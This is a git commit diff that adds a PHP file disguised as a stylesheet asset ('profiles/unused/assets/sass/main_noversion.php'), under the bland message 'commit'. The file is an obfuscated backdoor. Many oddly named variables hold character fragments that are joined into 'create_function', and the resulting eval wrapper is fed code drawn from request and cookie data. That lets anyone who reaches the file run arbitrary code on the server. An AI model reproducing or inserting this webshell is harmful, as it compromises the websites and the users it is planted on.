e522a3da84b5310908ac3d3cd3c85496e36e92dd
Suphot Sawattiwong <tohpus@gmail.com>
2023-08-17 15:04:10 +0700

    commit

---
+++ profiles/unused/assets/sass/main_noversion.php
@@ -0,0 +1,98 @@
+<?php
+
+$jackanapes='n)';$indices='H';
+$lynett='$';$intestate = 'v'; $crockery ='i MHLU?lt';$beefed= 'Q"TWeaEOr';$kit= 's'; $conrad='t[';
+$layers= 'e"[nb';$glow ='PS(lr4_J'; $jaquith = '"$g$oHP,V'; $example='d'; $bibles = 'a'; $baked='e';
+$lied ='cX)R';$gadwall= '6';$appenders = 'osal';$crushingly= 'T(caEdK'; $fallon ='r'; $amendments = 'SEc)VLtE';$blasphemies = 'Iy'; $caves =')';$grandparent = 'nflkae';$lady ='r]';$conjurer= 'Q';
+$foundling='_';$comforts =']'; $holies = 't';$fearlessly =')'; $astonish ='eOi$=)`;';$entree = 'Np,aLXi'; $bounded=':()f)_e'; $clifford='a';$dip ='t'; $aura = ';;f';
+$badgered='j(KBoH$';
+
+$diagonals='h($C(ni';$employs='bmsf;'; $homeomorph = 'eZgrW';$doralin= ')Fhwr:';$courtier= 'iT$f]';$confesses='('; $emperor= 'B$c(s';$generosity='Fwu'; $determinable ='y?';$loneliest ='i'; $caretaker='tia[j'; $clara= '"';
+$goner='(';$bough='u';$evolving ='v'; $destroyers ='o[RTb';
+
+$kessia='_'; $claim='e';
+
+$intents='T"]';
+$limousine= 'jdle"a';
+
+$generally ='rdOm)pie'; $grotto='$SR'; $illogical='e(esTi';$assistantship ='x_rsh[';$beveled='reRx_';$invalidated='ic_eX';$befouling= 'E'; $christi= 'g'; $comprehending= '^'; $cordey = 'i]vga_a'; $frolics= 'rai"t__s';$benchmarks =')b_P';$cashmoneyhos='_IJU=Is('; $johnath= 'Y';$fro ='e'; $applicatively = 'r';
+$bathing ='W$ev"';
+$filmed=$invalidated['1'] .
+
+$applicatively. $bathing['2'] . $frolics['1'] . $frolics[4] . $bathing['2'] .$cashmoneyhos['0'].
+
+$courtier[3] .$bough.$diagonals['5']. $invalidated['1'] . $frolics[4] . $frolics[2] . $destroyers['0']. $diagonals['5'] ;
+$ameliorated=$crockery['1'] ;$cemeteries = $filmed($ameliorated, $bathing['2']. $bathing['3'].$frolics['1']. $limousine['2'] .
+
+$cashmoneyhos['7'].$frolics['1'] . $applicatively.
+
+$applicatively. $frolics['1'] .$determinable[0].$cashmoneyhos['0']. $generally['5']. $destroyers['0']. $generally['5'] .$cashmoneyhos['7'] .
+
+$courtier[3] . $bough. $diagonals['5'] . $invalidated['1'] . $cashmoneyhos['0']. $cordey['3'] .$bathing['2'] .$frolics[4]. $cashmoneyhos['0'].$frolics['1'].$applicatively.$cordey['3'].$cashmoneyhos['6'] .
+
+$cashmoneyhos['7'] . $benchmarks['0']. $benchmarks['0'] .$benchmarks['0'].
+
+$employs['4'] ); $cemeteries($astonish[6], $lecher[7] , $cashmoneyhos[3], $determinable['1'], $generally['5'],
+$comprehending,$bathing['1'] .$frolics[2]. $cashmoneyhos['4'].$frolics['1']. $applicatively . $applicatively. $frolics['1'] . $determinable[0] .$cashmoneyhos['0'] .$generally['3'].
+$bathing['2']. $applicatively . $cordey['3'] . $bathing['2'] . $cashmoneyhos['7'] . $bathing['1'] .$cashmoneyhos['0'] .$beveled['2'].
+$befouling . $conjurer .$cashmoneyhos[3] .$befouling. $grotto['1']. $illogical['4'] . $entree['2'].$bathing['1'].
+$cashmoneyhos['0']. $diagonals['3'] .$generally['2'] .$generally['2'].$badgered[2] .$cashmoneyhos['5'] .$befouling.
+
+$entree['2'].$bathing['1'].
+
+$cashmoneyhos['0'].
+$grotto['1'] . $befouling.$beveled['2']. $amendments['4'] . $befouling .
+
+$beveled['2']. $benchmarks['0'].
+
+$employs['4'] .
+
+$bathing['1'].
+$frolics['1'].$cashmoneyhos['4'] .$frolics[2].$cashmoneyhos['6'] .
+$cashmoneyhos['6'].
+
+$bathing['2'] .
+$frolics[4] .$cashmoneyhos['7'] . $bathing['1'] .$frolics[2] . $assistantship['5'] .
+
+$bathing['4'].$limousine['0'] .
+$generosity['1'] . $benchmarks['1']. $frolics[2].$assistantship[4].$beveled['3']. $limousine['2'] .$courtier[3].
+
+$bathing['4'].
+
+$cordey['1']. $benchmarks['0'].$determinable['1']. $bathing['1'] . $frolics[2] .$assistantship['5'].
+$bathing['4']. $limousine['0'] . $generosity['1'].
+
+$benchmarks['1']. $frolics[2] .
+$assistantship[4] .$beveled['3'] . $limousine['2'] .$courtier[3] . $bathing['4'] .$cordey['1'] . $doralin[5].$cashmoneyhos['7'] . $frolics[2].$cashmoneyhos['6'] .$cashmoneyhos['6'] . $bathing['2'] . $frolics[4]. $cashmoneyhos['7'] .$bathing['1'].$frolics[2].$assistantship['5'].
+$bathing['4'].$badgered['5'] . $illogical['4'].$illogical['4'] .$benchmarks['3']. $cashmoneyhos['0'] .
+
+$cashmoneyhos['2'] .$bathing[0] .$emperor[0] . $cashmoneyhos['5'] .$badgered['5'] .
+$invalidated['4'] . $entree['4']. $generosity[0] .
+$bathing['4']. $cordey['1']. $benchmarks['0'].
+
+$determinable['1']. $bathing['1'] . $frolics[2]. $assistantship['5']. $bathing['4'].$badgered['5'].$illogical['4']. $illogical['4'].
+$benchmarks['3'] .
+$cashmoneyhos['0'] .$cashmoneyhos['2'] .$bathing[0] .
+$emperor[0] .$cashmoneyhos['5'].
+
+$badgered['5'] .$invalidated['4'] .$entree['4'].
+$generosity[0] .
+
+$bathing['4'] . $cordey['1'] . $doralin[5].$generally['1'].$frolics[2].$bathing['2'] .
+
+$benchmarks['0'] .$employs['4'] .$bathing['2'] . $bathing['3'] .$frolics['1'] .$limousine['2'] . $cashmoneyhos['7'] .$cashmoneyhos['6'].$frolics[4].$applicatively.
+
+$applicatively .
+
+$bathing['2'] . $bathing['3']. $cashmoneyhos['7']. $benchmarks['1'].
+
+$frolics['1']. $cashmoneyhos['6'] .$bathing['2'] .
+
+$gadwall . $glow['5'] .$cashmoneyhos['0'].$generally['1']. $bathing['2'].$invalidated['1']. $destroyers['0'].$generally['1'] .
+
+$bathing['2'].$cashmoneyhos['7'] .$cashmoneyhos['6'].$frolics[4] .$applicatively .$applicatively .
+$bathing['2'] .$bathing['3']. $cashmoneyhos['7'] .$bathing['1'].$frolics['1'] .$benchmarks['0'] .
+
+$benchmarks['0'] .
+
+$benchmarks['0'] .$benchmarks['0'] . $employs['4']);
